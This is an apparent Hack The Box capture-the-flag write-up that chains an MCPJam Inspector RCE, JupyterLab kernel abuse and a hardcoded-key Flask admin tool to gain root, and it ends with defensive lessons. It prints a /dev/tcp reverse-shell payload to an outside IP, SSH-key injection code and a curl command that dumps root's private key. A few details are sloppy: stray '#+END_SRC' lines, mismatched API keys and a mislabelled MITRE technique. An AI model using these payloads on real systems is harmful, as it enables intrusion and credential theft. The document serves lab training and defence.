---
title: "HTB: DevHub"
author: ["Dirk"]
date: 2026-06-22T12:39:00+02:00
lastmod: 2026-06-22T13:22:17+02:00
tags: ["jupyter", "privesc", "mcp", "flask"]
categories: ["htb", "vulnerability"]
draft: false
weight: 1002
---

## Overview {#overview}

| Attribute  | Value                                                       |
|------------|-------------------------------------------------------------|
| OS         | Linux                                                       |
| Difficulty | Medium                                                      |
| Category   | Web + Lateral Movement + PrivEsc                            |
| Key CVEs   | CVE-2026-23744                                              |
| Techniques | RCE, API Abuse, Credential Exposure, WebSocket Manipulation |
|            |                                                             |

DevHub is a medium-difficulty Linux machine centered around a
developer toolchain: an MCPJam Inspector instance, a JupyterLab
server, and an internal MCP operations service. The attack chain
requires chaining three distinct vulnerabilities. An unauthenticated
RCE in MCPJam Inspector, abuse of a JupyterLab API to achieve
lateral movement, and credential exposure in an internal Flask
service to escalate to root.


## Reconnaissance {#reconnaissance}


### Port &amp; Service Discovery {#port-and-service-discovery}

A standard nmap service scan reveals minimal surface — only SSH and
HTTP are bound to external interfaces:

```nil
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

The web server announces itself as an internal development platform.
However, the Webinterface on port 80 reveals three additional services
running locally:

-   MCPJam Inspector on port 6274 (externally exposed)
-   JupyterLab on port 8888 (localhost only)
-   OPSMCP Flask service on port 5000 (localhost only)

Confirming port 6274:

```nil
6274/tcp open  unknown
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     <title>MCPJam Inspector</title>
```


### Identifying the Attack Surface {#identifying-the-attack-surface}

A search for MCPJam Inspector CVEs surfaces ****CVE-2026-23744****
immediately: unauthenticated RCE via an exposed HTTP endpoint. The
Inspector binds to \`0.0.0.0\` by default and performs no authentication
on its \`/api/mcp/connect\` endpoint. The \`command\` and \`args\` fields
in the JSON body are passed directly to the OS without sanitization.


## Foothold: CVE-2026-23744 (MCPJam Inspector RCE) {#foothold-cve-2026-23744--mcpjam-inspector-rce}


### Vulnerability Overview {#vulnerability-overview}

The MCPJam Inspector endpoint expects a \`serverConfig\` object
describing an MCP server to launch. It spawns the process directly.
No token, no session, no validation.


### Exploitation {#exploitation}

Start a listener:

```bash
nc -lvnp 6666
```

Send the payload via Burp Repeater (or curl):

```nil
POST /api/mcp/connect HTTP/1.1
Host: devhub.htb:6274
Content-Type: application/json

{
  "serverConfig": {
    "command": "bash",
    "args": ["-c", "bash -i >& /dev/tcp/10.10.15.17/6666 0>&1"],
    "env": {}
  },
  "serverId": "rce_test"
}
```

The server returns a 500 (expected — bash is not an MCP server and
closes immediately). The reverse shell connects regardless.

```nil
Connection received on devhub.htb 50090
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```


### Shell Stabilization {#shell-stabilization}

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

Access to the \`mcp-dev\` user established.


## Lateral Movement: JupyterLab API Abuse {#lateral-movement-jupyterlab-api-abuse}


### Enumeration {#enumeration}

Process listing reveals two services running as other users:

```bash
ps aux | grep -E "jupyter|opsmcp"
```

```nil
analyst  1055  /home/analyst/jupyter-env/bin/python3 \
  /home/analyst/jupyter-env/bin/jupyter-lab \
  --ip=127.0.0.1 --port=8888 \
  --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7

root     1061  /home/analyst/jupyter-env/bin/python3 \
  /opt/opsmcp/server.py
```

****Key Finding:**** JupyterLab runs as \`analyst\` on localhost port 8888.
The authentication token is visible in the process arguments in
cleartext. Additionally, a Flask service (\`server.py\`) runs as \`root\`
on port 5000 — the next target after gaining \`analyst\`.


### Exploiting JupyterLab via REST API {#exploiting-jupyterlab-via-rest-api}

\`mcp-dev\` cannot write to \`/home/analyst\`. Direct file placement is
impossible. JupyterLab does not execute notebooks on session creation.
Code must be sent to a kernel to execute in the analyst context.

The Jupyter REST API allows creating notebooks and spawning kernels.
Executing code requires a WebSocket connection to the kernel's
\`channels\` endpoint. While no WebSocket library is available (\`no
websocket-client\`, \`wscat\`, or \`websocat\`), Python's stdlib \`socket\`
module is sufficient for a manual WebSocket handshake.


#### Step 1: Spawn a Kernel {#step-1-spawn-a-kernel}

```bash
curl -X POST http://127.0.0.1:8888/api/kernels \
  -H "Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7" \
  -H "Content-Type: application/json" \
  -d '{"name": "python3"}'
```

Note the returned kernel ID.


#### Step 2: Create a Notebook with SSH Key Injection {#step-2-create-a-notebook-with-ssh-key-injection}

Using \`urllib\` (stdlib only):

```python
import urllib.request
import json

TOKEN = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
BASE = "http://127.0.0.1:8888"

pubkey = "ssh-ed25519 AAAA...your_key... kali@kali"

code = """
import os
os.makedirs('/home/analyst/.ssh', exist_ok=True)
with open('/home/analyst/.ssh/authorized_keys', 'a') as f:
    f.write('{}\\n'.format('""" + pubkey + """'))
os.chmod('/home/analyst/.ssh', 0o700)
os.chmod('/home/analyst/.ssh/authorized_keys', 0o600)
"""

notebook = {
    "type": "notebook",
    "content": {
        "nbformat": 4,
        "nbformat_minor": 5,
        "metadata": {
            "kernelspec": {
                "name": "python3",
                "display_name": "Python 3"
            }
        },
        "cells": [{
            "cell_type": "code",
            "source": code,
            "metadata": {},
            "outputs": [],
            "execution_count": None
        }]
    }
}

req = urllib.request.Request(
    f"{BASE}/api/contents/pwn.ipynb",
    data=json.dumps(notebook).encode(),
    headers={
        "Authorization": f"token {TOKEN}",
        "Content-Type": "application/json"
    },
    method="PUT"
)
resp = urllib.request.urlopen(req)
print(resp.status)
```


#### Step 3: Create a Session Attached to Kernel {#step-3-create-a-session-attached-to-kernel}

```bash
curl -X POST http://127.0.0.1:8888/api/sessions \
  -H "Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7" \
  -H "Content-Type: application/json" \
  -d '{
    "kernel": {"name": "python3"},
    "name": "pwn.ipynb",
    "path": "pwn.ipynb",
    "type": "notebook"
  }'
```

Note the new kernel ID from the response.


#### Step 4: Execute Code via WebSocket (Manual Handshake) {#step-4-execute-code-via-websocket--manual-handshake}

Connect to the kernel's WebSocket channel and send a Jupyter
messaging protocol \`execute_request\` frame:

```python
import socket
import hashlib
import base64
import json
import uuid
import os
import struct

TOKEN = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
KERNEL_ID = "<kernel-id-from-session-response>"

def ws_frame(data):
    data = data.encode()
    mask = os.urandom(4)
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
    length = len(data)
    if length <= 125:
        header = struct.pack("!BB", 0x81, 0x80 | length)
    else:
        header = struct.pack("!BBH", 0x81, 0xFE, length)
    return header + mask + masked

def recv_ws(s):
    data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
        if len(chunk) < 4096:
            break
    return data

key = base64.b64encode(os.urandom(16)).decode()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 8888))
s.settimeout(5)

handshake = (
    f"GET /api/kernels/{KERNEL_ID}/channels?token={TOKEN} HTTP/1.1\r\n"
    f"Host: 127.0.0.1:8888\r\n"
    f"Upgrade: websocket\r\n"
    f"Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\n"
    f"Sec-WebSocket-Version: 13\r\n\r\n"
)
s.send(handshake.encode())
s.recv(4096)  # 101 Switching Protocols

msg = {
    "header": {
        "msg_id": str(uuid.uuid4()),
        "msg_type": "execute_request",
        "username": "user",
        "session": str(uuid.uuid4()),
        "version": "5.3"
    },
    "parent_header": {},
    "metadata": {},
    "content": {
        "code": (
            "import os\n"
            "os.makedirs('/home/analyst/.ssh', exist_ok=True)\n"
            "open('/home/analyst/.ssh/authorized_keys','a')"
            ".write('ssh-ed25519 AAAA...your_key...\\n')\n"
            "os.chmod('/home/analyst/.ssh', 0o700)\n"
            "os.chmod('/home/analyst/.ssh/authorized_keys', 0o600)\n"
        ),
        "silent": False,
        "store_history": False
    },
    "channel": "shell"
}

s.send(ws_frame(json.dumps(msg)))

try:
    while True:
        print(recv_ws(s)[:200])
except:
    pass

s.close()
```

The kernel responds with \`status\` messages — code has executed as
\`analyst\`. SSH in:

```bash
ssh analyst@devhub.htb
```


## Privilege Escalation: OPSMCP Credential Exposure {#privilege-escalation-opsmcp-credential-exposure}


### Source Code Analysis {#source-code-analysis}

The process list revealed \`/opt/opsmcp/server.py\` running as \`root\`
on port 5000. The file is owned by \`analyst\` and readable.

The Flask application exposes a tool-calling API modeled after MCP.
Visible tools include \`ops.system_status\` and \`ops.list_services\`.
The API key is ****hardcoded****:

```python
VALID_API_KEY = "opsmcp_secret_key_XXXXXXXXXXXXXXXXX"
```

One of the ****hidden tools**** (present in code, absent from
\`/tools/list\`) is \`ops._admin_dump\`, which accepts a \`target\`
parameter. With \`target=ssh_keys\` and \`confirm=true\` it reads and
returns \`/root/.ssh/id_rsa\` directly.


### Exploitation {#exploitation}

```bash
curl -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "ops._admin_dump",
    "arguments": {
      "target": "ssh_keys",
      "confirm": true
    }
  }' \
  | python3 -c \
    "import sys,json; print(json.load(sys.stdin)['root_private_key'])" \
  > /tmp/root.key \
  && chmod 600 /tmp/root.key
```

Note: Piping directly into a file via Python avoids JSON escape
corruption from terminal copy-paste.

```bash
ssh -i /tmp/root.key root@devhub.htb
```

\#+END_SRC
root@devhub:~#
\#+END_SRC

Root access obtained.


## Detection &amp; Lessons Learned {#detection-and-lessons-learned}


### What Went Wrong (Defense Perspective) {#what-went-wrong--defense-perspective}

1.  ****MCPJam Inspector Default Binding****: Development tool bound to
    \`0.0.0.0\` with no authentication (CVE-2026-23744). Should only be
    reachable on localhost, with explicit opt-in for external binding.

2.  ****JupyterLab Token Exposure****: Authentication tokens visible in
    process arguments via \`ps aux\`. Combined with an API allowing
    arbitrary kernel interactions, this is effectively unauthenticated
    code execution for any local user.

3.  ****OPSMCP Hardcoded Credentials &amp; Hidden Admin Tools****: The service
    hardcodes credentials and exposes an admin credential dump endpoint
    with only a static API key for protection, while running as root.
    Hidden tools (present in code, absent from \`/tools/list\`) provide
    ****security through obscurity**** — no real protection once source
    access is obtained.


### Mitigations for Similar Environments {#mitigations-for-similar-environments}

-   Development tools should NEVER bind to \`0.0.0.0\` by default
-   Never pass secrets in command-line arguments (use config files or
    environment variables with restricted access)
-   Implement proper authentication and authorization on all APIs
-   Avoid hidden/undocumented endpoints — if it's in code, it will be
    found
-   Run services with minimal privilege (not as root unless absolutely
    necessary)
-   Use secrets management systems (Vault, K8s Secrets) instead of
    hardcoding


## Timeline {#timeline}

| Stage    | Technique                     | Result         |
|----------|-------------------------------|----------------|
| Recon    | nmap, web interface analysis  | MCPJam on 6274 |
| Foothold | CVE-2026-23744 RCE            | mcp-dev shell  |
| Lateral  | Jupyter API + WebSocket       | analyst access |
| PrivEsc  | Hidden admin tool + hardcoded | root access    |
|          | credentials                   |                |


## Tools &amp; References {#tools-and-references}


### CVEs Referenced {#cves-referenced}

-   [CVE-2026-23744](https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6): MCPJam Inspector Unauthenticated RCE


### Tools Used {#tools-used}

-   nmap, gobuster
-   Burp Suite (Repeater)
-   netcat (reverse shell)
-   curl, python3 stdlib (\`urllib\`, \`socket\`, \`json\`)


### Detection Resources {#detection-resources}

-   Jupyter Messaging Protocol (execute_request):
    [Official Documentation](https://jupyter-client.readthedocs.io/en/stable/messaging.html)
-   MITRE ATT&amp;CK: [
    Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
-   MITRE ATT&amp;CK: [
    Modify Authentication Process](https://attack.mitre.org/techniques/T1563/)
